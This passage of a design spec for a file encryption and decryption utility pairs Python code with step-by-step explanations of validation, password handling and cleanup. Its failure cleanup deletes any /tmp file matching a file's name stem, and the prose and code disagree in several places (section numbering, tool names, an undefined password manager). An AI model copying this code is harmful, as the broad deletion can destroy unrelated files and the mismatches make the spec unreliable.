        )
        
        validated_files.append(manifest_entry)
    
    if not validated_files:
        raise FileFormatError("No valid files found to process")
    
    return validated_files

def validate_path_security(file_path: Path) -> None:
    """B2: Path traversal and security validation"""
    import os
    from pathlib import Path
    
    # B2a: Resolve absolute path and check for dangerous patterns
    try:
        # Get the absolute path of the intended base directories
        user_home = Path.home().resolve()
        current_dir = Path.cwd().resolve()
        allowed_dirs = [user_home, current_dir]
        
        # Get the absolute path of the user-provided file path
        resolved_path = file_path.resolve()
        
        # B2b: Check if the resolved path is within allowed directories
        is_allowed = False
        for base_dir in allowed_dirs:
            try:
                # Check if the resolved path is within the base directory
                resolved_path.relative_to(base_dir)
                is_allowed = True
                break
            except ValueError:
                # Path is not relative to this base directory, try next
                continue
        
        if not is_allowed:
            raise SecurityViolationError("File access outside allowed directories")
            
        # B2c: Additional component analysis for dangerous patterns
        for component in file_path.parts:
            if component in ['..', '.', ''] or component.startswith('.'):
                raise SecurityViolationError("Path traversal attempt detected")
                
    except (OSError, ValueError) as e:
        raise SecurityViolationError("Invalid file path")

def validate_file_access(file_path: Path) -> None:
    """B3: File access and permission validation"""
    # B3a: Existence check
    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {file_path}")
    
    # B3b: Read permission check
    if not os.access(file_path, os.R_OK):
        raise PermissionError(f"No read permission: {file_path}")
    
    # B3c: Size limit check
    file_size = file_path.stat().st_size
    if file_size > FastPassConfig.MAX_FILE_SIZE:
        raise FileFormatError(f"File too large: {file_size} bytes")
    
    # B3d: Write permission check for in-place operations
    parent_dir = file_path.parent
    if not os.access(parent_dir, os.W_OK):
        raise PermissionError(f"No write permission in directory: {parent_dir}")

def validate_file_format(file_path: Path) -> str:
    """B4: File format validation using magic number detection first"""
    import filetype
    
    # B4a: Primary validation - magic number detection
    detected_type = filetype.guess(str(file_path))
    file_extension = file_path.suffix.lower()
    
    # B4b: Magic number to format mapping (primary authority)
    magic_to_format = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx', 
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf',
    }
    
    if detected_type and detected_type.mime in magic_to_format:
        # Magic number detected - use this as authoritative format
        authoritative_format = magic_to_format[detected_type.mime]
        
        # B4c: Cross-validate with file extension
        if file_extension != authoritative_format:
            # Log warning but trust magic number over extension
            print(f"Warning: Extension mismatch for {file_path.name}: {file_extension} vs detected {authoritative_format}")
        
        # Check if detected format is supported
        if authoritative_format not in FastPassConfig.SUPPORTED_FORMATS:
            raise FileFormatError(f"Detected file format not supported: {authoritative_format}")
            
        return authoritative_format
    
    # B4d: Fallback to extension-based validation
    if file_extension in FastPassConfig.SUPPORTED_FORMATS:
        print(f"Warning: Could not detect magic number for {file_path.name}, trusting extension: {file_extension}")
        return file_extension
    
    # B4e: Neither magic number nor extension indicate supported format
    raise FileFormatError(f"Unsupported or undetectable file format: {file_extension}")

def detect_encryption_status(file_path: Path, file_format: str) -> bool:
    """B5: Detect if file is password protected"""
    if file_format in ['.docx', '.xlsx', '.pptx']:
        # B5a: Office document encryption detection
        import msoffcrypto
        with open(file_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            return office_file.is_encrypted()
    
    elif file_format == '.pdf':
        # B5b: PDF encryption detection
        import PyPDF2
        with open(file_path, 'rb') as f:
            pdf_reader = PyPDF2.PdfReader(f)
            return pdf_reader.is_encrypted
    
    return False

@dataclass
class FileManifest:
    """File manifest entry for processing pipeline"""
    path: Path
    format: str
    size: int
    is_encrypted: bool
    crypto_tool: str
```

**What's Actually Happening:**
- **B1: File Path Processing & Normalization**
  - Input processing: `args.files` list or `args.recursive` directory path
  - Path expansion: `os.path.expanduser('~/Documents/file.docx')` → `/home/user/Documents/file.docx`
  - Canonical paths: `pathlib.Path.resolve()` resolves symlinks and relative paths
  - File existence: `os.path.exists(file_path)` for each target file
  - Build file list: `validated_files = [Path objects with metadata]`
  - Missing files tracked: `missing_files = []` for error reporting
  - If any files missing: exit with detailed error message listing all missing files

- **B2: Path Traversal Security Analysis**
  - Absolute path resolution: `file_path.resolve()` to get canonical path with symlinks resolved
  - Base directory validation: Check if resolved path is within `Path.home().resolve()` or `Path.cwd().resolve()`
  - Containment checking: Use `resolved_path.relative_to(base_dir)` to verify path is within allowed boundaries
  - Component analysis: Reject paths containing `..`, `.`, hidden files, or empty components
  - System paths: Automatic rejection of paths outside configured allowed directories (default: user home and current working directory)
  - Error handling: Convert OSError/ValueError to SecurityViolationError with sanitized messages
  - Critical exit: if security violations detected, `sys.exit(3)` with generic "security violation" message

- **B3: File Format Magic Number Validation (Primary Authority)**
  - **Priority 1**: Magic number detection via `filetype.guess(file_path)` - authoritative format detection
  - **Priority 2**: File extension validation as fallback when magic number undetectable
  - Magic number mapping (trusted authority):
    ```python
    magic_to_format = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf',
        'application/zip': '.zip'
    }
    ```
  - Cross-validation: When magic number and extension disagree, trust magic number but log warning
  - Fallback strategy: If magic number undetectable, validate extension against supported formats
  - Format violations: Unsupported formats (by either method) trigger `FileFormatError`

- **B4: File Access & Permission Verification**
  - Read access test: `open(file_path, 'rb')` with exception handling
  - Sample read: read first 1024 bytes to verify file accessibility and detect corruption
  - Size validation: `os.path.getsize(file_path)` vs `max_file_size = 500MB` limit
  - Empty file check: `file_size == 0` indicates potential corruption or invalid file
  - Output directory access: if `--output-dir` specified, test write access to target directory
  - Permission violations: collected in `access_violations = []`
  - If access violations: `sys.exit(1)` with detailed permission error messages

- **B5: Password Protection Status Detection**
  - **Office Documents**: `msoffcrypto.OfficeFile(file_stream).is_encrypted()` returns boolean
  - **PDF Files**: `PyPDF2.PdfReader(file_stream).is_encrypted` property check
  - Store status: `password_status = {'file_path': bool}` for each file
  - **Special case**: If operation is 'encrypt' and file already encrypted, add to warnings
  - **Special case**: If operation is 'decrypt' and file not encrypted, add to warnings

- **B6: Validated File Manifest Creation**  
  - Build manifest: `file_manifest = []` containing complete file metadata
  - Manifest entry structure:
    ```python
    manifest_entry = {
        'path': Path,
        'extension': str,
        'format': str, 
        'size': int,
        'is_password_protected': bool,
        'crypto_tool': str,  # 'msoffcrypto', 'pypdf2'
        'temp_file_needed': bool
    }
    ```
  - Tool assignment: map file extension to appropriate crypto tool
  - Summary calculation: `total_files = len(file_manifest)`, `protected_files = count(is_password_protected)`
  - If critical errors: `sys.exit(3)` with validation summary
  - Success state: `validation_complete = True`, ready for crypto tool setup

---

## Section C: Crypto Tool Selection & Configuration

> **TOOL INTEGRATION CRITICAL**: Each crypto tool handler must be implemented exactly as diagrammed. Label each handler class and method with corresponding IDs.

```python
# C1: CRYPTO TOOL HANDLER SETUP
def setup_crypto_tools_and_configuration(validated_files: List[FileManifest]) -> Dict[str, Any]:
    """Initialize and configure crypto tool handlers based on file types"""
    
    # C1a: Determine required tools
    required_tools = set(manifest.crypto_tool for manifest in validated_files)
    
    crypto_handlers = {}
    
    # C1b: Initialize Office document handler
    if 'msoffcrypto' in required_tools:
        crypto_handlers['msoffcrypto'] = OfficeDocumentHandler()
    
    # C1c: Initialize PDF handler  
    if 'PyPDF2' in required_tools:
        crypto_handlers['PyPDF2'] = PDFHandler()
    
    return crypto_handlers

class OfficeDocumentHandler:
    """Handler for Office document encryption/decryption using msoffcrypto"""
    
    def __init__(self):
        import msoffcrypto
        self.msoffcrypto = msoffcrypto
        
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C2a: Secure Office document encryption with hardened security"""
        # Use the secure implementation that includes all security validations
        encrypt_file_secure(self, input_path, output_path, password)
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C2b: Decrypt Office document"""
        with open(input_path, 'rb') as input_file:
            office_file = self.msoffcrypto.OfficeFile(input_file)
            office_file.load_key(password=password)
            
            with open(output_path, 'wb') as output_file:
                office_file.save(output_file)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """C2c: Test if password works for Office document"""
        try:
            with open(file_path, 'rb') as f:
                office_file = self.msoffcrypto.OfficeFile(f)
                office_file.load_key(password=password)
                return True
        except Exception:
            return False

class PDFHandler:
    """Handler for PDF encryption/decryption using PyPDF2"""
    
    def __init__(self):
        import PyPDF2
        self.PyPDF2 = PyPDF2
        
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C3a: Encrypt PDF document"""
        with open(input_path, 'rb') as input_file:
            pdf_reader = self.PyPDF2.PdfReader(input_file)
            pdf_writer = self.PyPDF2.PdfWriter()
            
            # Copy all pages
            for page in pdf_reader.pages:
                pdf_writer.add_page(page)
            
            # Encrypt with password
            pdf_writer.encrypt(password)
            
            with open(output_path, 'wb') as output_file:
                pdf_writer.write(output_file)
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """C3b: Decrypt PDF document"""
        with open(input_path, 'rb') as input_file:
            pdf_reader = self.PyPDF2.PdfReader(input_file)
            
            if pdf_reader.is_encrypted:
                pdf_reader.decrypt(password)
            
            pdf_writer = self.PyPDF2.PdfWriter()
            
            # Copy all pages
            for page in pdf_reader.pages:
                pdf_writer.add_page(page)
            
            with open(output_path, 'wb') as output_file:
                pdf_writer.write(output_file)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """C3c: Test if password works for PDF"""
        try:
            with open(file_path, 'rb') as f:
                pdf_reader = self.PyPDF2.PdfReader(f)
                if pdf_reader.is_encrypted:
                    return pdf_reader.decrypt(password) == 1
                return True
        except Exception:
            return False

# C4: PASSWORD MANAGEMENT SYSTEM
class PasswordManager:
    """Manages password priority system and validation"""
    
    def __init__(self, cli_passwords: List[str], password_list_file: Optional[Path]):
        self.cli_passwords = cli_passwords or []
        self.password_list_file = password_list_file
        self.password_list: List[str] = []
        
        # C4a: Load password list from file
        if password_list_file:
            self.load_password_list()
    
    def load_password_list(self) -> None:
        """C4b: Load passwords from file"""
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                self.password_list = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            raise FileNotFoundError(f"Password list file not found: {self.password_list_file}")
    
    def get_password_candidates(self, file_path: Path) -> List[str]:
        """C4c: Get password candidates in priority order"""
        candidates = []
        
        # Priority 1: CLI passwords
        candidates.extend(self.cli_passwords)
        
        # Priority 2: Password list file
        candidates.extend(self.password_list)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_candidates = []
        for pwd in candidates:
            if pwd not in seen:
                seen.add(pwd)
                unique_candidates.append(pwd)
        
        return unique_candidates
    
    def find_working_password(self, file_path: Path, crypto_handler: Any) -> Optional[str]:
        """C4d: Find working password for file"""
        candidates = self.get_password_candidates(file_path)
        
        for password in candidates:
            if crypto_handler.test_password(file_path, password):
                return password
        
        return None
```

**What's Actually Happening:**
- **C1: File Format Analysis & Tool Mapping**
  - Process validated file manifest: `for file_entry in self.file_manifest:`
  - Extension-to-tool mapping:
    ```python
    tool_mapping = {
        '.docx': 'msoffcrypto', '.xlsx': 'msoffcrypto', '.pptx': 'msoffcrypto',
        '.doc': 'msoffcrypto', '.xls': 'msoffcrypto', '.ppt': 'msoffcrypto',  
        '.pdf': 'PyPDF2'
    }
    ```
  - Assign crypto tool: `file_entry['crypto_tool'] = tool_mapping[file_entry['extension']]`
  - Group by tool: `self.tool_groups = {'msoffcrypto': [], 'PyPDF2': []}`
  - Availability check: ensure required tools are available for file types present
  - If tool missing: `sys.exit(1)` with "Required crypto tool not available: {tool_name}"

- **C2: Crypto Tool Handler Initialization**
  - **msoffcrypto Handler**:
    ```python
    class OfficeHandler:
        def __init__(self):
            self.tool_path = 'python -m msoffcrypto.cli'
            self.temp_files = []
        
        def encrypt(self, input_path, output_path, password):
            # Implementation using msoffcrypto
        
        def decrypt(self, input_path, output_path, password):
            # Implementation using msoffcrypto
    ```
  - **PyPDF2 Handler**:
    ```python
    class PDFHandler:
        def __init__(self):
            self.pdf_library = 'PyPDF2'
        
        def encrypt(self, input_path, output_path, password):
            # Implementation using PyPDF2 library
    ```

- **C4: msoffcrypto-tool Configuration**
  - Test tool availability: `subprocess.run(['python', '-m', 'msoffcrypto.cli', '--version'])`
  - Configure encryption options:
    ```python
    office_config = {
        'password_method': 'standard',  # Use standard Office encryption
        'temp_dir': self.temp_working_dir,
        'preserve_metadata': True
    }
    ```
  - Set handler methods: `self.office_handler.set_config(office_config)`
  - Store in pipeline: `self.crypto_handlers['msoffcrypto'] = office_handler`

- **C5: PyPDF2 Configuration** 
  - Initialize PDF library:
    ```python
    import PyPDF2
    self.pdf_library = 'PyPDF2'
    # Verify version compatibility for encryption features
    if hasattr(PyPDF2, 'PdfWriter'):  # Check for newer API
        self.writer_class = PyPDF2.PdfWriter
    else:
        self.writer_class = PyPDF2.PdfFileWriter  # Legacy API
    ```
  - Configure PDF encryption settings:
    ```python
    pdf_config = {
        'encryption_algorithm': 'AES-256',
        'permissions': {'print': True, 'modify': False, 'copy': True},
        'user_password': None,  # Will be set per operation
        'owner_password': None  # Same as user password by default
    }
    ```


- **C7: Tool-Specific Option Configuration**
  - **Office Documents**: Set metadata preservation, compatible encryption methods
  - **PDF Files**: Configure user/owner passwords, permission settings
  - Password validation: ensure passwords meet tool-specific requirements
  - Error handling: configure timeout values, retry attempts for each tool
  - Logging: set up per-tool debug logging if enabled

- **C8: Processing Pipeline Creation**
  - Build processing queue: `self.processing_queue = []`
  - For each file, create processing task:
    ```python
    task = {
        'file_path': Path,
        'operation': 'encrypt' | 'decrypt',
        'crypto_handler': handler_object,
        'password': str,
        'output_path': Path,
        'temp_files': []
    }
    ```
  - Sort by file size: process smaller files first for faster feedback
  - Dependency resolution: if files depend on each other, order appropriately
  - Pipeline validation: ensure all tasks have required inputs and handlers
  - Ready state: `self.pipeline_ready = True`, `self.total_tasks = len(processing_queue)`

---

## Section D: File Processing & Operations

> **PROCESSING CRITICAL**: Each step must handle errors gracefully with proper cleanup. Map every processing step to exact code implementation.

```python
# D1: SECURE TEMPORARY DIRECTORY SETUP
def create_secure_temporary_directory() -> Path:
    """Create secure temporary working directory with proper permissions"""
    import tempfile
    import os
    from datetime import datetime
    
    # D1a: Generate unique temp directory name
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pid = os.getpid()
    temp_name = f"{FastPassConfig.TEMP_DIR_PREFIX}{timestamp}_{pid}"
    
    # D1b: Create temp directory with secure permissions
    temp_dir = Path(tempfile.mkdtemp(prefix=temp_name))
    os.chmod(temp_dir, 0o700)  # Owner read/write/execute only
    
    # D1c: Create subdirectories
    (temp_dir / 'processing').mkdir()
    (temp_dir / 'output').mkdir()
    
    return temp_dir

# D1d: ENHANCED TEMPORARY FILE MANAGEMENT WITH CLEANUP TRACKING
class TempFileManager:
    """Centralized temporary file management with guaranteed cleanup"""
    
    def __init__(self):
        self.temp_directories = []
        self.temp_files = []
        self.cleanup_registered = False
    
    def create_temp_directory(self) -> Path:
        """Create tracked temporary directory with automatic cleanup registration"""
        temp_dir = create_secure_temporary_directory()
        self.temp_directories.append(temp_dir)
        
        if not self.cleanup_registered:
            import atexit
            atexit.register(self.emergency_cleanup)
            self.cleanup_registered = True
            
        return temp_dir
    
    def emergency_cleanup(self):
        """Emergency cleanup for atexit registration"""
        for temp_dir in self.temp_directories:
            try:
                cleanup_temporary_directory(temp_dir)
            except Exception:
                pass  # Silent emergency cleanup

# D1e: CONTEXT MANAGER FOR SECURE TEMPORARY DIRECTORIES
class SecureTempDirectory:
    """Context manager ensuring automatic cleanup even on exceptions"""
    
    def __init__(self):
        self.temp_dir = None
    
    def __enter__(self) -> Path:
        self.temp_dir = create_secure_temporary_directory()
        return self.temp_dir
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.temp_dir:
            cleanup_temporary_directory(self.temp_dir)

# D2: FILE PROCESSING PIPELINE
def process_files_with_crypto_operations(
    validated_files: List[FileManifest], 
    crypto_handlers: Dict[str, Any],
    args: argparse.Namespace
) -> ProcessingResults:
    """Main file processing pipeline with crypto operations"""
    
    # D2a: Create secure temporary directory
    temp_dir = create_secure_temporary_directory()
    
    try:
        processing_results = ProcessingResults()
        
        for file_manifest in validated_files:
            try:
                # D2b: Process individual file
                result = process_single_file(
                    file_manifest, 
                    crypto_handlers[file_manifest.crypto_tool],
                    temp_dir,
                    args
                )
                processing_results.successful_files.append(result)
                
            except Exception as e:
                error_info = FileProcessingError(
                    file_path=file_manifest.path,
                    error_message=str(e),
                    error_type=type(e).__name__
                )
                # Sanitize error message before storing
                error_info.error_message = sanitize_error_message(error_info.error_message)
                processing_results.failed_files.append(error_info)
                
                # Clean up any partial processing for this file
                cleanup_failed_file_processing(file_manifest.path)
        
        return processing_results
        
    finally:
        # D2c: Guaranteed cleanup with error isolation
        try:
            cleanup_temporary_directory(temp_dir)
        except Exception as cleanup_error:
            # Log cleanup failure but don't mask processing results
            print(f"Warning: Cleanup failed for {temp_dir}: {cleanup_error}")

def process_single_file(
    file_manifest: FileManifest,
    crypto_handler: Any,
    temp_dir: Path,
    args: argparse.Namespace
) -> FileProcessingResult:
    """D3: Process a single file through crypto operations"""
    
    # D3a: Find working password
    password = crypto_handler.password_manager.find_working_password(
        file_manifest.path, crypto_handler
    )
    
    if not password:
        raise ProcessingError(f"No working password found for {file_manifest.path}")
    
    # D3b: Setup temporary file paths
    temp_input = temp_dir / 'processing' / f"input_{file_manifest.path.name}"
    temp_output = temp_dir / 'output' / f"output_{file_manifest.path.name}"
    
    # D3c: Copy input to temp location
    shutil.copy2(file_manifest.path, temp_input)
    
    # D3d: Perform crypto operation
    if args.operation == 'encrypt':
        crypto_handler.encrypt_file(temp_input, temp_output, password)
    else:  # decrypt
        crypto_handler.decrypt_file(temp_input, temp_output, password)
    
    # D3e: Validate output file
    validate_processed_file(temp_output, args.operation, crypto_handler)
    
    # D3f: Atomic move to final destination with error handling
    final_path = determine_output_path(file_manifest.path, args.output_dir)
    
    try:
        # Ensure target directory exists
        final_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Atomic move to final destination
        shutil.move(temp_output, final_path)
    except Exception as e:
        # Clean up temp output file if move fails
        if temp_output.exists():
            temp_output.unlink()
        raise ProcessingError(f"Failed to move processed file to destination: {e}")
    
    return FileProcessingResult(
        original_path=file_manifest.path,
        final_path=final_path,
        operation=args.operation,
        password_used=password,
        file_size_before=file_manifest.size,
        file_size_after=final_path.stat().st_size
    )

def validate_processed_file(output_path: Path, operation: str, crypto_handler: Any) -> None:
    """D4: Validate that processed file is correct"""
    
    # D4a: Check file exists and has reasonable size
    if not output_path.exists():
        raise ProcessingError("Output file was not created")
    
    if output_path.stat().st_size == 0:
        raise ProcessingError("Output file is empty")
    
    # D4b: Format-specific validation
    file_format = output_path.suffix.lower()
    
    if file_format in ['.docx', '.xlsx', '.pptx']:
        validate_office_document(output_path, operation)
    elif file_format == '.pdf':
        validate_pdf_document(output_path, operation)

def validate_office_document(file_path: Path, operation: str) -> None:
    """D4c: Validate Office document integrity"""
    import msoffcrypto
    
    try:
        with open(file_path, 'rb') as f:
            office_file = msoffcrypto.OfficeFile(f)
            
            if operation == 'encrypt':
                # After encryption, file should be encrypted
                if not office_file.is_encrypted():
                    raise ProcessingError("File was not properly encrypted")
            else:  # decrypt
                # After decryption, file should not be encrypted
                if office_file.is_encrypted():
                    raise ProcessingError("File was not properly decrypted")
    except Exception as e:
        raise ProcessingError(f"Office document validation failed: {e}")

def validate_pdf_document(file_path: Path, operation: str) -> None:
    """D4d: Validate PDF document integrity"""
    import PyPDF2
    
    try:
        with open(file_path, 'rb') as f:
            pdf_reader = PyPDF2.PdfReader(f)
            
            if operation == 'encrypt':
                # After encryption, PDF should be encrypted
                if not pdf_reader.is_encrypted:
                    raise ProcessingError("PDF was not properly encrypted")
            else:  # decrypt
                # After decryption, PDF should not be encrypted
                if pdf_reader.is_encrypted:
                    raise ProcessingError("PDF was not properly decrypted")
                    
            # Test that we can read at least one page
            if len(pdf_reader.pages) == 0:
                raise ProcessingError("PDF has no readable pages")
                
    except Exception as e:
        raise ProcessingError(f"PDF validation failed: {e}")

@dataclass
class ProcessingResults:
    successful_files: List[FileProcessingResult] = field(default_factory=list)
    failed_files: List[FileProcessingError] = field(default_factory=list)

@dataclass  
class FileProcessingResult:
    original_path: Path
    final_path: Path
    operation: str
    password_used: str
    file_size_before: int
    file_size_after: int

@dataclass
class FileProcessingError:
    file_path: Path
    error_message: str
    error_type: str

def cleanup_failed_file_processing(file_path: Path) -> None:
    """Clean up processing artifacts for a failed file"""
    import tempfile
    import shutil
    
    try:
        # Remove any temporary files associated with this file
        temp_patterns = [
            f"*{file_path.stem}*",
            f"temp_{file_path.name}*",
            f"processing_{file_path.name}*"
        ]
        
        # Clean up from common temp locations
        temp_dirs = [Path.cwd() / 'temp', Path('/tmp'), Path(tempfile.gettempdir())]
        
        for temp_dir in temp_dirs:
            if temp_dir.exists():
                for pattern in temp_patterns:
                    for temp_file in temp_dir.glob(pattern):
                        try:
                            if temp_file.is_file():
                                temp_file.unlink()
                            elif temp_file.is_dir():
                                shutil.rmtree(temp_file)
                        except Exception:
                            # Continue cleanup even if some files can't be removed
                            pass
                            
    except Exception:
        # Don't let cleanup errors propagate
        pass
```

**What's Actually Happening:**
- **D1: Secure Temporary Directory Setup**
  - Generate unique temp directory: `temp_name = f'FastPass_{datetime.now():%Y%m%d_%H%M%S}_{os.getpid()}'`
  - Create with secure permissions: `tempfile.mkdtemp(prefix=temp_name)` then `os.chmod(temp_dir, 0o700)`
  - Directory structure: `temp_dir/processing/` for input files, `temp_dir/output/` for processed files
  - Cleanup tracking: `self.temp_directories_created = [temp_dir]` for later cleanup

- **D2: Processing Pipeline Execution**
  - Queue processing: `for task in self.processing_queue:`
  - File isolation: copy each file to `temp_dir/processing/` before processing
  - Tool routing: select appropriate crypto handler based on file format
  - Password application: use `password_manager.find_working_password()` for each file
  - Operation dispatch: call `handler.encrypt()` or `handler.decrypt()` based on mode
  - Output validation: verify processed file integrity and correct encryption status
  - Error handling: collect failures in `failed_files = []`, continue processing remaining files

- **D3: Individual File Processing**
  - **Input preparation**: Copy file to temp location with `shutil.copy2(original, temp_input)`
  - **Password validation**: Test password with crypto tool before processing
  - **Processing execution**: 
    - For Office files: use msoffcrypto library via subprocess or direct API
    - For PDF files: use PyPDF2 with PdfReader/PdfWriter classes
  - **Output verification**: Confirm processed file has correct encryption status
  - **File movement**: Move from temp location to final destination (in-place or output directory)

- **D4: File Integrity Validation**
  - **Existence check**: Verify output file was created and is non-empty
  - **Format validation**: Ensure file still opens correctly with appropriate tool
  - **Encryption status**: Verify encrypt/decrypt operation achieved expected result:
    - After encryption: file should be password-protected
    - After decryption: file should not require password
  - **Content integrity**: For PDFs, verify at least one page readable; for Office docs, verify document structure intact
  - **Size sanity check**: File size should be reasonable (not 0 bytes, not dramatically different unless expected)

- **D5: Enhanced Temporary File Management**
  - **Cleanup tracking**: `TempFileManager` class tracks all temporary files and directories
  - **Emergency cleanup**: `atexit.register()` ensures cleanup even on unexpected termination
  - **Context managers**: `SecureTempDirectory` provides automatic cleanup with `try`/`finally`
  - **Retry logic**: Multiple cleanup attempts with exponential backoff for permission issues
  - **Secure deletion**: Overwrite sensitive temporary files with zeros before deletion
  - **Error isolation**: Cleanup failures don't mask original processing errors

- **D6: Error Handling & Recovery**
  - **Per-file errors**: Collect in `processing_errors = []` with details, continue processing other files
  - **Critical errors**: Stop processing, restore all backups, cleanup temp files
  - **Password errors**: Distinguish between wrong password vs crypto tool failure
  - **File corruption**: Detect if input file becomes corrupted during processing
  - **Partial success**: Some files succeed, some fail - report both with detailed status

---

## Section E: Cleanup & Results Reporting

> **CLEANUP CRITICAL**: All temporary files, passwords in memory, and system state must be properly cleaned up. Map every cleanup operation to code.

```python
# E1: RESULTS SUMMARIZATION AND CLEANUP
def cleanup_and_generate_final_report(processing_results: ProcessingResults) -> int:
    """Generate final report and determine exit code"""
    
    # E1a: Calculate summary statistics
    total_files = len(processing_results.successful_files) + len(processing_results.failed_files)
    successful_count = len(processing_results.successful_files)
    failed_count = len(processing_results.failed_files)
    
    # E1b: Generate report
    generate_operation_report(processing_results, total_files, successful_count, failed_count)
    
    # E1c: Clear sensitive data from memory
    clear_sensitive_data()
    
    # E1d: Determine exit code
    if failed_count == 0 and successful_count > 0:
        return 0  # Success
    elif failed_count > 0 and successful_count > 0:
        return 1  # Partial success
    elif failed_count > 0 and successful_count == 0:
        return 1  # Complete failure
    else:
        return 2  # No files processed

def generate_operation_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int, 
    failed_count: int,
    report_format: str = 'text'
) -> None:
    """E2: Generate comprehensive operation report in specified format"""
    
    if report_format == 'json':
        generate_json_report(processing_results, total_files, successful_count, failed_count)
    elif report_format == 'csv':
        generate_csv_report(processing_results, total_files, successful_count, failed_count)
    else:  # text format (default)
        generate_text_report(processing_results, total_files, successful_count, failed_count)

def generate_text_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate human-readable text report"""
    
    print("\n" + "="*50)
    print("FastPass Operation Complete")
    print("="*50)
    
    # E2a: Summary statistics
    print(f"Total files processed: {total_files}")
    print(f"Successful: {successful_count}")
    print(f"Failed: {failed_count}")
    
    # E2b: List successful files
    if processing_results.successful_files:
        print(f"\n✓ Successful files:")
        for result in processing_results.successful_files:
            size_change = result.file_size_after - result.file_size_before
            size_indicator = f"({size_change:+d} bytes)" if size_change != 0 else ""
            print(f"  • {result.original_path.name} → {result.final_path.name} {size_indicator}")
    
    # E2c: List failed files
    if processing_results.failed_files:
        print(f"\n✗ Failed files:")
        for error in processing_results.failed_files:
            print(f"  • {error.file_path.name}: {error.error_message}")
    
    # E2d: Next steps
    if failed_count > 0:
        print(f"\nTroubleshooting:")
        print("- Verify passwords are correct")
        print("- Check file permissions")
        print("- Ensure files are not corrupted")

def generate_json_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate machine-readable JSON report"""
    import json
    from datetime import datetime
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_files": total_files,
            "successful": successful_count,
            "failed": failed_count,
            "success_rate": successful_count / total_files if total_files > 0 else 0
        },
        "successful_files": [
            {
                "original_path": str(result.original_path),
                "final_path": str(result.final_path),
                "operation": result.operation,
                "file_size_before": result.file_size_before,
                "file_size_after": result.file_size_after,
                "size_change": result.file_size_after - result.file_size_before
            }
            for result in processing_results.successful_files
        ],
        "failed_files": [
            {
                "file_path": str(error.file_path),
                "error_message": error.error_message,
                "error_type": error.error_type
            }
            for error in processing_results.failed_files
        ]
    }
    
    print(json.dumps(report, indent=2))

def generate_csv_report(
    processing_results: ProcessingResults,
    total_files: int,
    successful_count: int,
    failed_count: int
) -> None:
    """Generate CSV format report"""
    import csv
    import sys
    
    writer = csv.writer(sys.stdout)
    
    # Write header
    writer.writerow(['file_path', 'status', 'operation', 'size_before', 'size_after', 'error_message'])
    
    # Write successful files
    for result in processing_results.successful_files:
        writer.writerow([
            str(result.original_path),
            'success',
            result.operation,
            result.file_size_before,
            result.file_size_after,
            ''
        ])
    
    # Write failed files
    for error in processing_results.failed_files:
        writer.writerow([
            str(error.file_path),
            'failed',
            '',
            '',
            '',
            error.error_message
        ])

def clear_sensitive_data() -> None:
    """E3: Clear passwords and sensitive data from memory"""
    import gc
    
    # E3a: This would be implemented to overwrite password variables
    # In practice, Python doesn't provide direct memory overwriting
    # but we can delete variables and force garbage collection
    
    # Clear any global password variables
    globals_to_clear = [k for k in globals().keys() if 'password' in k.lower()]
    for var_name in globals_to_clear:
        if var_name in globals():
            del globals()[var_name]
    
    # Force garbage collection
    gc.collect()

def cleanup_temporary_directory(temp_dir: Path) -> None:
    """E4: Secure cleanup with retry logic and secure file deletion"""
    import shutil
    import time
    import os
    
    if not temp_dir.exists():
        return
    
    # E4a: Multiple cleanup attempts with exponential backoff
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            # E4b: Secure deletion of sensitive files (attempt to overwrite)
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    try:
                        file_size = file_path.stat().st_size
                        # Only attempt secure deletion for reasonably sized files
                        if 0 < file_size < 10 * 1024 * 1024:  # < 10MB
                            with open(file_path, 'r+b') as f:
                                f.write(b'\x00' * file_size)
                                f.flush()
                                os.fsync(f.fileno())
                    except Exception:
                        # Secure deletion failed, continue with normal deletion
                        pass
            
            # E4c: Remove entire directory tree
            shutil.rmtree(temp_dir)
            return  # Success - exit retry loop
            
        except (PermissionError, OSError) as e:
            if attempt < max_attempts - 1:
                # Exponential backoff for retry
                time.sleep(0.1 * (2 ** attempt))
                continue
            else:
                print(f"Warning: Could not clean up temp directory {temp_dir}: {e}")
                break
```

**What's Actually Happening:**
- **E1: Operation Summary & Statistics Calculation**
  - Count files: `total_files = len(self.processing_results)`
  - Success rate: `successful_files = len([r for r in results if r.status == 'success'])`
  - Failure breakdown: categorize failures by type (password, permission, corruption, tool failure)
  - Processing time: `total_time = datetime.now() - self.operation_start_time`
  - Performance stats: files per second, total bytes processed, average file size

- **E2: Comprehensive Results Report Generation**
  - **Header section**: FastPass version, operation mode, timestamp
  - **Summary statistics**: Total files, success count, failure count, processing time
  - **Successful files list**: 
    ```
    ✓ Successful files:
      • document1.docx → document1.docx (encrypted, +1,247 bytes)
      • report.pdf → secured/report.pdf (decrypted, -892 bytes)
      • data.xlsx → data.xlsx (encrypted, +2,156 bytes)
